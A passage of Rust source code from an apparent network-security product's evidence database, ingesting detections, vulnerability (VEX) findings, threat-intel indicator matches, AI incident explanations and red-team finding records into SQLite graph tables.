                let severity: i64 = match level { "DISCONNECT" => SEV_HIGH, "SHADOW" => SEV_MEDIUM, _ => SEV_LOW }; // JITTER=LOW
                let det_id = sid("aegis", &format!("reflex:{ip}:{level}:{score:.4}"));
                let rule_msg = format!("AEGIS reflex {level}: {ip} -> {response}");
                self.conn.execute(
                    "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![det_id, ts, 0i64, rule_msg, "aegis_reflex", severity, "", ip, "", 0i64, score])?;
                let dev_id = sid("dev", ip);
                self.conn.execute(
                    "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
                     ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
                    params![dev_id, ip, ts, ts])?;
                self.add_edge(&det_id, "detects_on_device", &dev_id, ts)?;
                Ok(Some(det_id))
            }
            "guard" => {
                let action = v["action"].as_str().unwrap_or("");
                let verdict = v["verdict"].as_str().unwrap_or("");
                if action.is_empty() || verdict.is_empty() || verdict == "AutoApply" { return Ok(None); }
                let reason = v["reason"].as_str().unwrap_or("");
                let severity: i64 = if verdict == "Deny" { SEV_MEDIUM } else { SEV_LOW }; // RequireApproval=LOW
                let det_id = sid("aegis", &format!("guard:{action}:{verdict}"));
                let rule_msg = format!("AEGIS guard {verdict}: {action} — {reason}");
                self.conn.execute(
                    "INSERT INTO detections VALUES (?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
                    params![det_id, ts, 0i64, rule_msg, "aegis_guard", severity, "", "", "", 0i64, 1.0f64])?;
                Ok(Some(det_id))
            }
            _ => Ok(None),
        }
    }

    /// Ingest one QSECBIT reading (`/var/lib/hookprobe/qsecbit-scores`, JSON — see
    /// `modules/qsecbit/src/main.rs`'s doc comment for the shape:
    /// `{"score","band","drift","qdrift","p_attack","decay","maha_dist","entropy_nats"}`) → a
    /// `qsecbit_scores` node — the backing node for Mission Control's "Organism Status" orb (F-B6;
    /// previously computed but never entering the graph at all).
    ///
    /// **Design choice (a node, not a `devices` column):** QSECBIT scores THIS host's own
    /// resilience, not a LAN device learned from a flow's `src_ip` — `devices` is keyed by LAN ip
    /// and altering its schema mid-flight (`ALTER TABLE ADD COLUMN`) on an already-deployed
    /// `evidence.db` is exactly the kind of migration risk this evidence-layer-only pass should
    /// avoid. A new node type + a `qsecbit_score_of` edge to a synthetic `dev:self` node keeps the
    /// same node+edge shape every other table in this crate already uses, and reuses the existing
    /// device-upsert idiom (`ingest_host_event` does the same "sighting-only device" gap-fix).
    ///
    /// `id` is deterministic over the reading's own values, not ingest-time wall clock (qsecbit's
    /// output carries no timestamp — see the module's doc comment) — the same idempotency
    /// reasoning as `ingest_dns_verdict`/`ingest_aegis_verdict`.
    pub fn ingest_qsecbit_score(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let score = match v["score"].as_f64() { Some(s) => s, None => return Ok(None) };
        let band = v["band"].as_str().unwrap_or("");
        if band.is_empty() { return Ok(None); } // not a qsecbit reading
        let drift = v["drift"].as_f64().unwrap_or(0.0);
        let qdrift = v["qdrift"].as_f64().unwrap_or(0.0);
        let p_attack = v["p_attack"].as_f64().unwrap_or(0.0);
        let decay = v["decay"].as_f64().unwrap_or(0.0);
        let maha = v["maha_dist"].as_f64().unwrap_or(0.0);
        let entropy = v["entropy_nats"].as_f64().unwrap_or(0.0);
        let ts = now_ts();
        let qsb_id = sid("qsb", &format!(
            "{score:.4}:{band}:{drift:.4}:{qdrift:.4}:{p_attack:.4}:{decay:.4}:{maha:.4}:{entropy:.4}"));
        self.conn.execute(
            "INSERT INTO qsecbit_scores VALUES (?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![qsb_id, ts, score, band, drift, qdrift, p_attack, decay, maha, entropy])?;
        let self_id = sid("dev", "self");
        self.conn.execute(
            "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
            params![self_id, "self", ts, ts])?;
        self.add_edge(&qsb_id, "qsecbit_score_of", &self_id, ts)?;
        Ok(Some(qsb_id))
    }

    /// Ingest one exploitability finding (ADR 0024 — a `hookprobe_exploit::pipeline::Finding` as a
    /// JSON line, the output of the SBOM→CVE→EPSS→VEX→SSVC pipeline) → a `vulns` node (the CVE
    /// matched against a shipped component) + a `vex_findings` node (its VEX status + SSVC
    /// decision) + two edges: `assessed_as` (finding → CVE) and `vulnerable_in` (CVE → `dev:self`).
    /// So an operator's own-device subgraph now answers "which component on THIS device is
    /// known-exploitable and reachable right now" — real supply-chain data in the ONE evidence
    /// graph, not a mock. Idempotent (ids are deterministic over cve+component+version; ON CONFLICT
    /// DO UPDATE refreshes the assessment on each pipeline pass).
    pub fn ingest_vex_finding(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let cve = v["cve"].as_str().unwrap_or("");
        let component = v["component"].as_str().unwrap_or("");
        if cve.is_empty() || component.is_empty() { return Ok(None); } // not a finding line
        let version = v["component_version"].as_str().unwrap_or("");
        let key = format!("{cve}:{component}:{version}");
        let vuln_id = sid("cve", &key);
        let vex_id = sid("vex", &key);
        let ts = now_ts();
        let summary = v["summary"].as_str().unwrap_or("");
        let cvss = v["cvss"].as_f64().unwrap_or(0.0);
        let epss = v["epss"].as_f64().unwrap_or(0.0);
        let kev = if v["kev"].as_bool().unwrap_or(false) { 1 } else { 0 };
        let published = v["published"].as_str().unwrap_or("");
        self.conn.execute(
            "INSERT INTO vulns VALUES (?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO UPDATE SET \
             ts=excluded.ts, summary=excluded.summary, cvss=excluded.cvss, epss=excluded.epss, kev=excluded.kev",
            params![vuln_id, ts, cve, component, version, summary, cvss, epss, kev, published])?;
        let status = v["status"].as_str().unwrap_or("under_investigation");
        let justification = v["justification"].as_str().unwrap_or("");
        let ssvc = v["ssvc"].as_str().unwrap_or("");
        let exploitation = v["exploitation"].as_str().unwrap_or("");
        let exposed = if v["exposed"].as_bool().unwrap_or(false) { 1 } else { 0 };
        let reason = v["ssvc_reason"].as_str().unwrap_or("");
        let fixed = v["fixed_version"].as_str().unwrap_or("");
        let impact = v["impact_statement"].as_str().unwrap_or("");
        self.conn.execute(
            "INSERT INTO vex_findings VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO UPDATE SET \
             ts=excluded.ts, status=excluded.status, justification=excluded.justification, \
             ssvc=excluded.ssvc, exploitation=excluded.exploitation, exposed=excluded.exposed, \
             epss=excluded.epss, reason=excluded.reason, fixed_version=excluded.fixed_version, \
             impact_statement=excluded.impact_statement",
            params![vex_id, ts, cve, component, status, justification, ssvc, exploitation, exposed, epss, reason, fixed, impact])?;
        let self_id = sid("dev", "self");
        self.conn.execute(
            "INSERT INTO devices (id,ip,first_seen,last_seen) VALUES (?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET last_seen=max(devices.last_seen, excluded.last_seen), first_seen=min(devices.first_seen, excluded.first_seen)",
            params![self_id, "self", ts, ts])?;
        self.add_edge(&vex_id, "assessed_as", &vuln_id, ts)?;
        // Only link CVEs that actually apply to this device (affected/under_investigation) to
        // dev:self — a not_affected CVE must NOT show up as "this device is vulnerable".
        if status == "affected" || status == "under_investigation" {
            self.add_edge(&vuln_id, "vulnerable_in", &self_id, ts)?;
        }
        Ok(Some(vex_id))
    }

    /// Ingest one HYDRA IOC-match line (ADR 0027 — `crates/hookprobe-hydra`'s bundled-feed matcher,
    /// the IOC/threat-intel half of Intelligence; `hookprobe-exploit`/ADR 0024 above is the CVE
    /// half) → the SAME `detections` row every other engine produces (via [`Self::ingest_detection`],
    /// reused verbatim — HYDRA does not reimplement device-upsert/flow-linkage/user-attribution) PLUS
    /// the `iocs`-table bookkeeping and enrichment edges that make this genuinely an ENRICHMENT
    /// pipeline, not just another detector:
    ///
    /// - upserts the `iocs` row for this indicator (`hits` counts every match, ever — the "how many
    ///   times has this indicator been seen" the Intelligence workspace wants),
    /// - `enriched_by`: this NEW detection → the ioc node (the match's own provenance),
    /// - `ioc_seen_on`: the ioc node → whichever side of the match is a LOCAL device (never the
    ///   indicator's own value, which a domain match writes into `dst_ip` — see below),
    /// - `enriched_by` again onto every OTHER pre-existing `detections` row that already named this
    ///   exact indicator value (as either `src_ip` or `dst_ip`) — e.g. a NAPSE port-scan whose
    ///   attacker IP is ALSO a known-bad indicator now carries that intel context too — and onto
    ///   every pre-existing `incidents` row for a device this match touched, so an operator opening
    ///   an incident sees the matched intel without hunting for it separately.
    ///
    /// Expects the SAME detection-JSON shape `ingest_detection` reads (`rule_id`/`rule_msg`/
    /// `category`/`severity`/`mitre`/`src_ip`/`dst_ip`/`dst_port`/`confidence`) plus HYDRA's own
    /// `indicator`/`ioc_type`/`ioc_family` fields (`ingest_detection` itself ignores the extras, same
    /// as every other producer's surplus fields). Returns `Ok(None)` for anything that isn't a HYDRA
    /// ioc-match line (no `indicator`/`ioc_type`) OR that `ingest_detection` itself rejected.
    pub fn ingest_ioc_match(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let indicator = v["indicator"].as_str().unwrap_or("");
        let ioc_type = v["ioc_type"].as_str().unwrap_or("");
        if indicator.is_empty() || ioc_type.is_empty() { return Ok(None); } // not a HYDRA ioc-match line

        // Reuse the SAME path every network/host/dns/aegis detection already goes through.
        let Some(det_id) = self.ingest_detection(line)? else { return Ok(None) };
        let ts = v["ts"].as_f64().unwrap_or_else(now_ts);
        let family = v["ioc_family"].as_str().unwrap_or("");
        let ioc_id = sid("ioc", indicator);
        self.conn.execute(
            "INSERT INTO iocs (id,ts,indicator,ioc_type,family,hits) VALUES (?,?,?,?,?,1) \
             ON CONFLICT (id) DO UPDATE SET ts=excluded.ts, hits=iocs.hits+1, \
               family=CASE WHEN excluded.family<>'' THEN excluded.family ELSE iocs.family END",
            params![ioc_id, ts, indicator, ioc_type, family])?;
        self.add_edge(&det_id, "enriched_by", &ioc_id, ts)?;

        let src_ip = v["src_ip"].as_str().unwrap_or("");
        let dst_ip = v["dst_ip"].as_str().unwrap_or("");
        // `ioc_seen_on`: only the side of the match that is a REAL local device — never the
        // indicator's own value (a domain-type match writes the domain into `dst_ip`, mirroring
        // `ingest_dns_verdict`'s convention; that is not a "device the indicator was seen on").
        for candidate in [src_ip, dst_ip] {
            if !candidate.is_empty()
                && candidate != indicator
                && hookprobe_mgmt_guard::classify_source(candidate) == hookprobe_mgmt_guard::SourceKind::Lan
            {
                let dev_id = sid("dev", candidate);
                self.add_edge(&ioc_id, "ioc_seen_on", &dev_id, ts)?;
            }
        }

        // Enrichment: any OTHER pre-existing detection that already names this exact indicator
        // value gets the same intel context attached — this is what makes HYDRA an ENRICHER, not
        // merely a fourth alert source alongside NAPSE/host-EDR/dnsxai/AEGIS.
        {
            let mut stmt = self.conn.prepare(
                "SELECT id FROM detections WHERE (src_ip=?1 OR dst_ip=?1) AND id<>?2")?;
            let other_dets: Vec<String> = stmt
                .query_map(params![indicator, det_id], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok())
                .collect();
            for other in other_dets {
                self.add_edge(&other, "enriched_by", &ioc_id, ts)?;
            }
        }
        // Same for any incident already open on a device this match touched. Deliberately checks
        // BOTH src_ip and dst_ip VERBATIM, with NO indicator-exclusion filter (unlike the
        // `ioc_seen_on` loop above): an incident's `device_ip` legitimately EQUALS the indicator
        // itself in the common inbound case — `correlate_incident` keys an incident by the
        // triggering detections' `src_ip`, which for a port-scan/brute-force IS the attacker's IP,
        // i.e. exactly the value an inbound IOC match names. Excluding it here would silently miss
        // enriching the one incident this match is most relevant to.
        for candidate in [src_ip, dst_ip] {
            if candidate.is_empty() { continue; }
            let mut stmt = self.conn.prepare("SELECT id FROM incidents WHERE device_ip=?")?;
            let incs: Vec<String> = stmt
                .query_map(params![candidate], |r| r.get::<_, String>(0))?
                .filter_map(|r| r.ok())
                .collect();
            for inc in incs {
                self.add_edge(&inc, "enriched_by", &ioc_id, ts)?;
            }
        }
        Ok(Some(det_id))
    }

    /// Record the AEGIS BYO-LLM planner's explanation over one EXISTING incident (ADR 0025,
    /// `crates/hookprobe-planner`). This is the ONLY writer of the `ai_explanations` table and the
    /// ONLY way `incident_detail`'s `model` field ever becomes non-null — until this has run at
    /// least once for a given incident, `model` stays `null` (never fabricated; see
    /// `incident_detail`'s own doc comment). Deliberately narrow: this call attaches an
    /// EXPLANATION (why/confidence/reasoning text) to an incident that must already exist — it
    /// never creates an incident, never mutates one, and is not reachable from any enforcement
    /// path (C9: the planner is assistive-only). `line` is a JSON object:
    /// `{"incident_id":"inc:...","model":"<endpoint>::<model-id>","why":"...","confidence":91.0,
    ///   "reasoning":"..."}`. Returns `Ok(None)` (not an error) for a malformed line OR an
    /// `incident_id` that doesn't exist — the caller (the planner's HTTP handler) treats either as
    /// "nothing recorded", matching every other `ingest_*` method's silent-skip convention in this
    /// file.
    pub fn record_ai_explanation(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) { Ok(v) => v, Err(_) => return Ok(None) };
        let incident_id = v["incident_id"].as_str().unwrap_or("");
        let model = v["model"].as_str().unwrap_or("");
        if incident_id.is_empty() || model.is_empty() { return Ok(None); }
        let exists: bool = self.conn
            .query_row("SELECT 1 FROM incidents WHERE id=?", params![incident_id], |_| Ok(true))
            .optional()?
            .unwrap_or(false);
        if !exists { return Ok(None); } // never fabricate an incident to attach an explanation to
        let why = v["why"].as_str().unwrap_or("");
        let confidence = v["confidence"].as_f64().unwrap_or(0.0);
        let reasoning = v["reasoning"].as_str().unwrap_or("");
        let ts = now_ts();
        let id = sid("aiexpl", &format!("{incident_id}:{ts:.6}:{model}"));
        self.conn.execute(
            "INSERT INTO ai_explanations (id, incident_id, ts, model, why, confidence, reasoning) \
             VALUES (?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![id, incident_id, ts, model, why, confidence, reasoning])?;
        Ok(Some(id))
    }

    /// The latest `ai_explanations` row for one incident, if the planner has ever run over it.
    /// Returns `(model, why, confidence, reasoning, ts)`. Used only by [`Self::incident_detail`].
    fn latest_ai_explanation(&self, incident_id: &str) -> Result<Option<AiExplanationRow>> {
        self.conn
            .query_row(
                "SELECT model, why, confidence, reasoning, ts FROM ai_explanations \
                 WHERE incident_id=? ORDER BY ts DESC LIMIT 1",
                params![incident_id],
                |r| {
                    Ok(AiExplanationRow {
                        model: r.get(0)?,
                        why: r.get(1)?,
                        confidence: r.get(2)?,
                        reasoning: r.get(3)?,
                        ts: r.get(4)?,
                    })
                },
            )
            .optional()
            .map_err(Into::into)
    }

    /// List the exploitability findings (ADR 0024) for the `/api/exploitability` surface — ordered
    /// most-actionable first (act > attend > track > defer, then EPSS desc), the same ranking the
    /// pipeline applies, so the API and the on-disk VEX agree. Read-only.
    pub fn list_exploitability(&self, limit: i64) -> Result<String> {
        let mut stmt = self.conn.prepare(
            "SELECT f.cve, f.component, f.status, f.justification, f.ssvc, f.exploitation, \
                    f.exposed, f.epss, f.reason, f.fixed_version, f.impact_statement, \
                    v.component_version, v.summary, v.cvss, v.kev, v.published \
             FROM vex_findings f LEFT JOIN vulns v ON v.cve=f.cve AND v.component=f.component \
             ORDER BY (CASE f.ssvc WHEN 'act' THEN 0 WHEN 'attend' THEN 1 WHEN 'track' THEN 2 ELSE 3 END), \
                      f.epss DESC, f.cve ASC LIMIT ?")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "cve": r.get::<_, String>(0)?,
                    "component": r.get::<_, String>(1)?,
                    "status": r.get::<_, String>(2)?,
                    "justification": r.get::<_, String>(3)?,
                    "ssvc": r.get::<_, String>(4)?,
                    "exploitation": r.get::<_, String>(5)?,
                    "exposed": r.get::<_, i64>(6)? != 0,
                    "epss": r.get::<_, f64>(7)?,
                    "reason": r.get::<_, String>(8)?,
                    "fixed_version": r.get::<_, String>(9)?,
                    "impact_statement": r.get::<_, String>(10)?,
                    "component_version": r.get::<_, Option<String>>(11)?.unwrap_or_default(),
                    "summary": r.get::<_, Option<String>>(12)?.unwrap_or_default(),
                    "cvss": r.get::<_, Option<f64>>(13)?.unwrap_or(0.0),
                    "kev": r.get::<_, Option<i64>>(14)?.unwrap_or(0) != 0,
                    "published": r.get::<_, Option<String>>(15)?.unwrap_or_default(),
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        // Small KPI rollup so the Intelligence workspace can show honest counts (replacing the
        // hard-coded itlMock KPIs): totals by SSVC decision + status.
        let summary = self.conn.query_row(
            "SELECT \
               SUM(CASE WHEN ssvc='act' THEN 1 ELSE 0 END), \
               SUM(CASE WHEN ssvc='attend' THEN 1 ELSE 0 END), \
               SUM(CASE WHEN status='affected' THEN 1 ELSE 0 END), \
               SUM(CASE WHEN status='not_affected' THEN 1 ELSE 0 END), \
               SUM(CASE WHEN status='under_investigation' THEN 1 ELSE 0 END), \
               COUNT(*) FROM vex_findings",
            [],
            |r| Ok(serde_json::json!({
                "act": r.get::<_, Option<i64>>(0)?.unwrap_or(0),
                "attend": r.get::<_, Option<i64>>(1)?.unwrap_or(0),
                "affected": r.get::<_, Option<i64>>(2)?.unwrap_or(0),
                "not_affected": r.get::<_, Option<i64>>(3)?.unwrap_or(0),
                "under_investigation": r.get::<_, Option<i64>>(4)?.unwrap_or(0),
                "total": r.get::<_, Option<i64>>(5)?.unwrap_or(0),
            })),
        ).unwrap_or(serde_json::json!({}));
        Ok(serde_json::json!({"summary": summary, "findings": rows}).to_string())
    }

    /// HYDRA's IOC matcher (`crates/hookprobe-hydra`, ADR 0027) candidate feed: every flow ingested
    /// since HYDRA's OWN watermark (`meta["hydra_watermark"]` — the SAME "read since last run, then
    /// advance" idiom [`Self::correlate_all`]'s `correlate_watermark` already established), joined to
    /// whatever SNI/HTTP-Host/JA3 that SAME flow's Application pivot resolved (empty string when the
    /// flow never carried one — `ingest_flow`'s app-pivot never fabricates a domain/JA3 a flow didn't
    /// actually present, and neither does this read; `LEFT JOIN` so a flow with no application pivot
    /// still yields its bare `(src_ip,dst_ip)` pair for IP-only matching). A periodic HYDRA run only
    /// re-scans NEW flow activity, not the whole history every pass; the watermark advances to the
    /// newest ts seen among the rows THIS call returns (so nothing is skipped even if the caller
    /// finds zero matches this pass). First call ever (no watermark row) scans from ts=0.
    pub fn ioc_flow_candidates(&self, limit: i64) -> Result<String> {
        let watermark: f64 = self.get_meta("hydra_watermark")?
            .and_then(|s| s.parse().ok())
            .unwrap_or(0.0);
        let mut stmt = self.conn.prepare(
            "SELECT f.ts, f.src_ip, f.dst_ip, f.dst_port, \
                    COALESCE(a.sni,''), COALESCE(a.http_host,''), COALESCE(a.ja3,''), \
                    COALESCE(a.ja4,''), COALESCE(a.ja4s,'') \
             FROM flows f \
             LEFT JOIN edges e ON e.src_id = f.id AND e.edge_type='flow_to_application' \
             LEFT JOIN applications a ON a.id = e.dst_id \
             WHERE f.ts > ?1 ORDER BY f.ts ASC LIMIT ?2")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![watermark, limit], |r| {
                Ok(serde_json::json!({
                    "ts": r.get::<_, f64>(0)?,
                    "src_ip": r.get::<_, String>(1)?,
                    "dst_ip": r.get::<_, String>(2)?,
                    "dst_port": r.get::<_, i64>(3)?,
                    "sni": r.get::<_, String>(4)?,
                    "http_host": r.get::<_, String>(5)?,
                    "ja3": r.get::<_, String>(6)?,
                    "ja4": r.get::<_, String>(7)?,
                    "ja4s": r.get::<_, String>(8)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        if let Some(max_ts) = rows.iter().filter_map(|r| r["ts"].as_f64()).fold(None::<f64>, |acc, x| {
            Some(acc.map_or(x, |a| a.max(x)))
        }) {
            self.set_meta("hydra_watermark", &max_ts.to_string())?;
        }
        Ok(serde_json::json!(rows).to_string())
    }

    /// HYDRA's file-hash IOC matcher candidate feed (2026-07-09, `hookprobe_hydra::matcher::match_hash`
    /// — see that function's doc comment for why it existed type-complete-but-not-live-wired until
    /// now): every `files` row that carries a real `sha256` (a fanotify write event the loader
    /// successfully hashed — see `hookprobe-fanotify`'s size-cap doc for when it doesn't) since
    /// HYDRA's OWN file-hash watermark. A SEPARATE watermark key (`hydra_file_watermark`) from
    /// [`Self::ioc_flow_candidates`]'s `hydra_watermark` — these are two independent candidate
    /// streams (flow vs. file), and sharing one watermark would silently skip whichever stream
    /// advances it last. Same "read since last run, advance to the newest ts seen" idiom as
    /// `ioc_flow_candidates`/`correlate_all`'s watermark.
    pub fn ioc_file_candidates(&self, limit: i64) -> Result<String> {
        let watermark: f64 = self.get_meta("hydra_file_watermark")?
            .and_then(|s| s.parse().ok())
            .unwrap_or(0.0);
        let mut stmt = self.conn.prepare(
            "SELECT ts, device_ip, sha256 FROM files \
             WHERE sha256 <> '' AND ts > ?1 ORDER BY ts ASC LIMIT ?2")?;
        let rows: Vec<serde_json::Value> = stmt
            .query_map(params![watermark, limit], |r| {
                Ok(serde_json::json!({
                    "ts": r.get::<_, f64>(0)?,
                    "device_ip": r.get::<_, String>(1)?,
                    "sha256": r.get::<_, String>(2)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();
        if let Some(max_ts) = rows.iter().filter_map(|r| r["ts"].as_f64()).fold(None::<f64>, |acc, x| {
            Some(acc.map_or(x, |a| a.max(x)))
        }) {
            self.set_meta("hydra_file_watermark", &max_ts.to_string())?;
        }
        Ok(serde_json::json!(rows).to_string())
    }

    /// `GET /api/intel` (ADR 0027): the Intelligence workspace's IOC/threat-intel surface — real
    /// `iocs` rows (highest-hit-count first) + an honest type-breakdown summary + the most recent
    /// HYDRA-sourced detections (`category='threat_intel'`), replacing part of
    /// `ui/src/store/itlMock.ts`'s hard-coded data. Deliberately does NOT duplicate the CVE/VEX
    /// surface — `cve_lens` just points at the existing `/api/exploitability` (ADR 0024), which
    /// already serves that half; Intelligence renders both by calling both endpoints. Read-only.
    pub fn list_intel(&self, limit: i64) -> Result<String> {
        let mut stmt = self.conn.prepare(
            "SELECT id, ts, indicator, ioc_type, family, hits FROM iocs \
             ORDER BY hits DESC, ts DESC LIMIT ?")?;
        let iocs: Vec<serde_json::Value> = stmt
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "indicator": r.get::<_, String>(2)?,
                    "ioc_type": r.get::<_, String>(3)?,
                    "family": r.get::<_, String>(4)?,
                    "hits": r.get::<_, i64>(5)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();

        let summary = self.conn.query_row(
            "SELECT COUNT(*), COALESCE(SUM(hits),0), \
                    SUM(CASE WHEN ioc_type='ip' THEN 1 ELSE 0 END), \
                    SUM(CASE WHEN ioc_type='domain' THEN 1 ELSE 0 END), \
                    SUM(CASE WHEN ioc_type='sha256' THEN 1 ELSE 0 END), \
                    SUM(CASE WHEN ioc_type='ja3' THEN 1 ELSE 0 END), \
                    SUM(CASE WHEN ioc_type='ja4' THEN 1 ELSE 0 END), \
                    SUM(CASE WHEN ioc_type='ja4s' THEN 1 ELSE 0 END) \
             FROM iocs",
            [],
            |r| Ok(serde_json::json!({
                "total_indicators": r.get::<_, i64>(0)?,
                "total_hits": r.get::<_, i64>(1)?,
                "ip": r.get::<_, Option<i64>>(2)?.unwrap_or(0),
                "domain": r.get::<_, Option<i64>>(3)?.unwrap_or(0),
                "sha256": r.get::<_, Option<i64>>(4)?.unwrap_or(0),
                "ja3": r.get::<_, Option<i64>>(5)?.unwrap_or(0),
                // roadmap-B: JA4/JA4S IOC-type tiles — without these a loaded+matching JA4
                // indicator was invisible in the Intelligence summary (audit GAP-6).
                "ja4": r.get::<_, Option<i64>>(6)?.unwrap_or(0),
                "ja4s": r.get::<_, Option<i64>>(7)?.unwrap_or(0),
            })),
        ).unwrap_or(serde_json::json!({"total_indicators": 0, "total_hits": 0}));

        let mut stmt2 = self.conn.prepare(
            "SELECT id, ts, rule_id, rule_msg, severity, src_ip, dst_ip, dst_port, confidence \
             FROM detections WHERE category='threat_intel' ORDER BY ts DESC LIMIT ?")?;
        let recent_matches: Vec<serde_json::Value> = stmt2
            .query_map(params![limit], |r| {
                Ok(serde_json::json!({
                    "id": r.get::<_, String>(0)?,
                    "ts": r.get::<_, f64>(1)?,
                    "rule_id": r.get::<_, i64>(2)?,
                    "rule_msg": r.get::<_, String>(3)?,
                    "severity": r.get::<_, i64>(4)?,
                    "src_ip": r.get::<_, String>(5)?,
                    "dst_ip": r.get::<_, String>(6)?,
                    "dst_port": r.get::<_, i64>(7)?,
                    "confidence": r.get::<_, f64>(8)?,
                }))
            })?
            .filter_map(|r| r.ok())
            .collect();

        Ok(serde_json::json!({
            "iocs": iocs,
            "summary": summary,
            "recent_matches": recent_matches,
            "cve_lens": "/api/exploitability",
        }).to_string())
    }

    /// Ingest one `attack_run.json` (ADR 0020 D6 — the redteam-engine's pre-fire audit node,
    /// `security/redteam/engine/src/findings.rs::AttackRun`) → an `attack_runs` node. The SAME file
    /// is written once (Amber, before any probe fires) and again (final verdict, after every probe
    /// has run) — re-ingesting it is idempotent (`ON CONFLICT ... DO UPDATE`, keyed on `id`), so a
    /// timer/CI step can safely re-ingest the file at any point in a campaign's lifetime and always
    /// see its LATEST recorded verdict, never a stale one.
    pub fn ingest_attack_run(&self, json: &str) -> Result<Option<String>> {
        let v: serde_json::Value = serde_json::from_str(json).context("parse attack_run.json")?;
        let id = v["id"].as_str().unwrap_or("");
        if id.is_empty() {
            return Ok(None); // not an attack_run line
        }
        let ts = v["ts"].as_str().unwrap_or("");
        let roe_hash = v["roe_hash"].as_str().unwrap_or("");
        let cadence = v["cadence"].as_str().unwrap_or("");
        let image_version = v["image_version"].as_str().unwrap_or("");
        let dut_targets = v["dut_targets"]
            .as_array()
            .map(|a| a.iter().filter_map(|t| t.as_str()).collect::<Vec<_>>().join(";"))
            .unwrap_or_default();
        let operator = v["operator"].as_str().unwrap_or("");
        let verdict = v["verdict"].as_str().unwrap_or("");
        self.conn.execute(
            "INSERT INTO attack_runs VALUES (?,?,?,?,?,?,?,?) \
             ON CONFLICT (id) DO UPDATE SET ts=excluded.ts, verdict=excluded.verdict",
            params![id, ts, roe_hash, cadence, image_version, dut_targets, operator, verdict],
        )?;
        Ok(Some(id.to_string()))
    }

    /// Ingest one `finding` JSON line (ADR 0020 D6 — one line of `security/redteam/.../findings.jsonl`,
    /// `redteam_engine::findings::Finding`) → a `findings` node + an `attack_run_produced` edge from
    /// its parent `attack_runs` node (created if not already ingested — a finding can be ingested
    /// before its attack_run.json, same "gap-fix" idiom `ingest_beacon`/`ingest_response` already
    /// use for their own not-yet-linked case). A `breached`/RED finding ALSO gets a `breached` edge
    /// to a synthetic `component:<target_component>` node (there is no requirement that a real node
    /// exist there yet — this crate's `edges` table has no FK enforcement, exactly like `supersedes`
    /// pointing at an ADR id that may not have been ingested yet), and, if `validates_adr` names one,
    /// a `validates` edge to that `adrs` node (again, present or not — the edge itself is the
    /// traceability claim; `product-steward`'s roadmap-truth pass resolves whether the target
    /// node exists). **Re-derives the honesty invariant defensively**: `verified_fired=false` is
    /// stored as `outcome='inconclusive'` regardless of what the JSON claims — the engine's own
    /// `Finding::new` already enforces this, but an ingest path must never trust an upstream
    /// producer's claim over the bit that actually matters (the same posture `classify_source`/
    /// `is_wan_ingress_martian` take toward any attacker-shaped field).
    pub fn ingest_finding(&self, line: &str) -> Result<Option<String>> {
        let v: serde_json::Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(_) => return Ok(None),
        };
        let id = v["id"].as_str().unwrap_or("");
        let attack_run = v["attack_run"].as_str().unwrap_or("");
        if id.is_empty() || attack_run.is_empty() {
            return Ok(None); // not a finding line
        }
        let ts = v["ts"].as_str().unwrap_or("");
        let layer = v["layer"].as_str().unwrap_or("");
        let probe = v["probe"].as_str().unwrap_or("");
        let target_component = v["target_component"].as_str().unwrap_or("");
        let verified_fired = v["verified_fired"].as_bool().unwrap_or(false);
        let claimed_outcome = v["outcome"].as_str().unwrap_or("inconclusive");
        // Defensive re-derivation (never trust the claim over the bit): unverified => inconclusive.
        let outcome = if verified_fired { claimed_outcome } else { "inconclusive" };
        let severity = v["severity"].as_str().unwrap_or("info");
        let evidence_ref = v["evidence_ref"].as_str().unwrap_or("");
        let mitre_attck = v["mitre_attck"].as_str().unwrap_or("");
        let repro_seed = v["repro_seed"].as_i64().unwrap_or(0);
        self.conn.execute(
            "INSERT INTO findings VALUES (?,?,?,?,?,?,?,?,?,?,?,?) ON CONFLICT (id) DO NOTHING",
            params![
                id, ts, attack_run, layer, probe, target_component, outcome, severity,
                verified_fired as i64, evidence_ref, mitre_attck, repro_seed
            ],
        )?;
        self.add_edge(attack_run, EDGE_ATTACK_RUN_PRODUCED, id, 0.0)?;
        // RED-class or breached findings get the `breached` edge (D6): finding → the defense it
        // defeated (a synthetic component node id — see the doc comment above for why no FK/
        // existence requirement is placed on the target).
        if outcome == "breached" {
            let comp_id = format!("component:{target_component}");
            self.add_edge(id, EDGE_BREACHED, &comp_id, 0.0)?;
        }
        if let Some(adr_num) = v["validates_adr"].as_str().filter(|s| !s.is_empty()) {
            let adr_id = sid("adr", adr_num);
